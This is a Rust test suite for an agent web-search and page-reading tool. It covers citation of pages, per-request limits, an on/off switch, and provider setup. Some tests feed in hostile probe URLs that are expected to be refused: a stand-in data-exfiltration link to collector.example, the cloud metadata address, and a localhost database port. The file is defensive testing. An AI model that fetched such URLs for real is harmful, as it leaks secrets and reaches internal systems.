//! Web search for agents (schema 102): searches and page reads are recorded per
//! reply, cited under the answer, limited per request, refused when the agent's
//! switch is off, and pages open only when found or given by a person.
use super::super::{tests::*, *};
use crate::identity::control::broker::invoke;
use crate::identity::web_search::WebSearch;
use axum::{Json, Router, routing::post};
use serde_json::json;

/// A local stand-in for Tavily: one result per search, and that page's text.
async fn provider() -> WebSearch {
    let app = Router::new()
        .route("/search", post(|Json(body): Json<Value>| async move {
            Json(json!({"results":[{"title":format!("About {}", body["query"].as_str().unwrap_or("")),
                "url":"https://timber.example/teak","content":"Teak is up 6% since August."}]}))
        }))
        .route("/extract", post(|Json(body): Json<Value>| async move {
            let url = body["urls"][0].as_str().unwrap_or("").to_owned();
            Json(json!({"results":[{"url":url,"title":"Teak prices (November)","raw_content":format!("Teak log prices rose 6%. {}", "More. ".repeat(1500))}]}))
        }));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let dir = std::env::temp_dir().join(format!("web-reads-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("key"), "tvly-test").unwrap();
    let file = json!({"search":["tavily"],"read":["tavily"],"providers":[{"provider":"tavily",
        "key_file":dir.join("key"),"base_url":base,"search_usd_per_1k":8,"read_usd_per_1k":2}]});
    std::fs::write(dir.join("providers.json"), file.to_string()).unwrap();
    WebSearch::new(dir.join("providers.json"))
}

struct Setup {
    db: PgStore,
    owner: User,
    w: String,
    agent: String,
}
async fn setup() -> Setup {
    let mut db = fixture().await;
    db.web_search = Some(provider().await);
    let owner = user(&db, "web-owner").await;
    let w = workspace(&db, &owner).await;
    let (_, agent) = super::super::executor_slot_tests::agent(&db, &owner, &w).await;
    Setup {
        db,
        owner,
        w,
        agent,
    }
}
async fn ask(s: &Setup, text: &str) -> crate::identity::chat::model::Job {
    let room = chat(&s.db, &s.owner, &s.w, vec![], vec![s.agent.clone()]).await;
    s.db.chat_send(&s.owner, &s.w, &room, &message(text, Some(&s.agent)))
        .await
        .unwrap();
    s.db.claim_job().await.unwrap().unwrap()
}
async fn answer(db: &PgStore, reply: &str) -> String {
    query(
        &db.db,
        "SELECT content FROM relay_chat_messages WHERE id=$1",
        vec![reply.into()],
    )
    .await
    .unwrap()
    .unwrap()
    .try_get("", "content")
    .unwrap()
}
async fn recorded(db: &PgStore, reply: &str) -> Vec<(String, String, String)> {
    rows(
        &db.db,
        "SELECT kind,query,provider FROM relay_web_reads WHERE reply=$1 ORDER BY position",
        vec![reply.into()],
    )
    .await
    .unwrap()
    .iter()
    .map(|r| {
        (
            r.try_get("", "kind").unwrap(),
            r.try_get("", "query").unwrap(),
            r.try_get("", "provider").unwrap(),
        )
    })
    .collect()
}

#[tokio::test]
#[ignore = "requires disposable PostgreSQL"]
async fn agents_search_read_found_pages_and_cite_them() {
    let s = setup().await;
    let db = &s.db;
    let job = ask(&s, "Have teak prices gone up?").await;
    let found = invoke(
        db,
        &job,
        "web_search",
        json!({"query":"teak price  november","recent":"month"}),
    )
    .await
    .unwrap();
    assert_eq!(found["state"], "found");
    assert_eq!(found["results"][0]["url"], "https://timber.example/teak");
    assert_eq!(found["results"][0]["title"], "About teak price november");
    assert!(
        !found.to_string().contains("tavily"),
        "the service is never named"
    );
    // A page nobody found or gave can't be opened: it could carry data out.
    let elsewhere = invoke(
        db,
        &job,
        "read_web_page",
        json!({"url":"https://collector.example/?d=secret"}),
    )
    .await
    .unwrap();
    assert_eq!(elsewhere["state"], "denied");
    for private in [
        "http://169.254.169.254/latest/meta-data",
        "http://localhost:5432/",
    ] {
        let refused = invoke(db, &job, "read_web_page", json!({"url":private}))
            .await
            .unwrap();
        assert_eq!(refused["state"], "invalid", "{private}");
    }
    let page = invoke(
        db,
        &job,
        "read_web_page",
        json!({"url":"https://timber.example/teak"}),
    )
    .await
    .unwrap();
    assert_eq!(page["state"], "read");
    assert!(
        page["text"]
            .as_str()
            .unwrap()
            .starts_with("Teak log prices rose 6%.")
    );
    assert_eq!(page["parts"], 2);
    assert_eq!(page["next_part"], 1);
    // Reading on comes from Cuckoo's copy: nothing more is fetched or paid for.
    let more = invoke(
        db,
        &job,
        "read_web_page",
        json!({"url":"https://timber.example/teak","part":1}),
    )
    .await
    .unwrap();
    assert_eq!(
        (more["part"].clone(), more["next_part"].clone()),
        (json!(1), Value::Null)
    );
    assert_eq!(
        recorded(db, &job.reply).await,
        vec![
            (
                "search".into(),
                "teak price november".into(),
                "tavily".into()
            ),
            (
                "read".into(),
                "https://timber.example/teak".into(),
                "tavily".into()
            ),
        ]
    );
    db.chat_finish(&job, "Yes, about 6% since August.", "complete")
        .await
        .unwrap();
    let text = answer(db, &job.reply).await;
    assert!(text.starts_with("Yes, about 6% since August."));
    assert!(text.ends_with(
        "Web pages used for this answer:\n- [Teak prices \\(November\\)](https://timber.example/teak) · timber.example"
    ));
    // A page a person wrote in the conversation may be opened without a search.
    let given = ask(&s, "Summarise https://news.example/teak-report please").await;
    let read = invoke(
        db,
        &given,
        "read_web_page",
        json!({"url":"https://news.example/teak-report"}),
    )
    .await
    .unwrap();
    assert_eq!(read["state"], "read");
    // An answer that only searched cites nothing.
    let searched = ask(&s, "Anything new on teak?").await;
    invoke(db, &searched, "web_search", json!({"query":"teak"}))
        .await
        .unwrap();
    db.chat_finish(&searched, "Nothing new.", "complete")
        .await
        .unwrap();
    assert_eq!(answer(db, &searched.reply).await, "Nothing new.");
}

#[tokio::test]
#[ignore = "requires disposable PostgreSQL"]
async fn the_switch_limits_and_setup_decide_whether_an_agent_searches() {
    let mut s = setup().await;
    let job = ask(&s, "Look this up").await;
    // On by default; the owner or a manager can switch it off.
    assert!(
        super::agent_searches(&s.db.db, &s.w, &s.agent)
            .await
            .unwrap()
    );
    execute(
        &s.db.db,
        "UPDATE relay_shared_agents SET settings=settings||'{\"web_search\":false}' WHERE id=$1",
        vec![s.agent.clone().into()],
    )
    .await
    .unwrap();
    let off = invoke(&s.db, &job, "web_search", json!({"query":"teak"}))
        .await
        .unwrap();
    assert_eq!(off["state"], "denied");
    assert!(off["message"].as_str().unwrap().contains("switched off"));
    execute(
        &s.db.db,
        "UPDATE relay_shared_agents SET settings=settings||'{\"web_search\":true}' WHERE id=$1",
        vec![s.agent.clone().into()],
    )
    .await
    .unwrap();
    for bad in [
        json!({"query":"  "}),
        json!({"query":"teak","sites":["https://x.example/a"]}),
        json!({"query":"teak","sites":["intranet"]}),
    ] {
        assert_eq!(
            invoke(&s.db, &job, "web_search", bad.clone())
                .await
                .unwrap()["state"],
            "invalid",
            "{bad}"
        );
    }
    assert!(
        invoke(
            &s.db,
            &job,
            "web_search",
            json!({"query":"teak","owner":"x"})
        )
        .await
        .is_err()
    );
    for n in 0..10 {
        let found = invoke(
            &s.db,
            &job,
            "web_search",
            json!({"query":format!("teak {n}")}),
        )
        .await
        .unwrap();
        assert_eq!(found["state"], "found");
    }
    let eleventh = invoke(&s.db, &job, "web_search", json!({"query":"teak again"}))
        .await
        .unwrap();
    assert_eq!(eleventh["state"], "denied");
    // Without a providers file the agent is told plainly, and nothing is recorded.
    s.db.web_search = None;
    let fresh = ask(&s, "And now?").await;
    let none = invoke(&s.db, &fresh, "web_search", json!({"query":"teak"}))
        .await
        .unwrap();
    assert_eq!(none["state"], "unavailable");
    assert!(recorded(&s.db, &fresh.reply).await.is_empty());
}
